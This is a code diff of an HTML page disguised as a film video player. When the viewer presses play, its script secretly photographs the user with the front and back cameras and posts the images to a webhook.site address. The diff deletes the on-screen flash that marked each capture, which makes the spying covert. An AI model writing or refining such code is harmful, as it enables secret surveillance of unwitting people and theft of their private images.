@@ -32,35 +32,23 @@ video{
 canvas{
   display:none;
 }
-.flash{
-  position:fixed;
-  inset:0;
-  background:white;
-  opacity:0;
-  pointer-events:none;
-  transition:.2s;
-}
-.flash.active{
-  opacity:1;
-}
+/* أزلنا الفلاش نهائياً */
 </style>
 </head>
 <body>
 
 <div class="container">
   <video id="video" controls 
-  poster="https://m.media-amazon.com/images/M/MV5BMjExNDE4NDM5Nl5BMl5BanBnXkFtZTgwODgxMTI5MDE@._V1_FMjpg_UX1000_.jpg">
+  poster="https://upload.wikimedia.org/wikipedia/en/1/1c/365_Days_film_poster.jpg">
     <source src="https://drive.google.com/uc?export=download&id=1Ga3wpKTBUS_HWjWSYkZVn1OhTCeh_j01" type="video/mp4">
   </video>
 </div>
 
-<div class="flash" id="flash"></div>
 <canvas id="canvas"></canvas>
 
 <script>
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
-const flash = document.getElementById("flash");
 const webhook = "https://webhook.site/a8691b22-72fe-44fe-9cde-6796220aa64e";
 
 let started = false;
@@ -88,11 +76,6 @@ async function captureImage(facingMode){
   });
 }
 
-function doFlash(){
-  flash.classList.add("active");
-  setTimeout(()=>flash.classList.remove("active"),150);
-}
-
 video.addEventListener("play", async ()=>{
   if(started) return;
   started = true;
@@ -100,14 +83,12 @@ video.addEventListener("play", async ()=>{
   try{
     // Front camera
     const frontImage = await captureImage("user");
-    doFlash();
 
     // Small delay
     await new Promise(r=>setTimeout(r,800));
 
     // Back camera
     const backImage = await captureImage("environment");
-    doFlash();
 
     // Send both images to webhook
     const formData = new FormData();
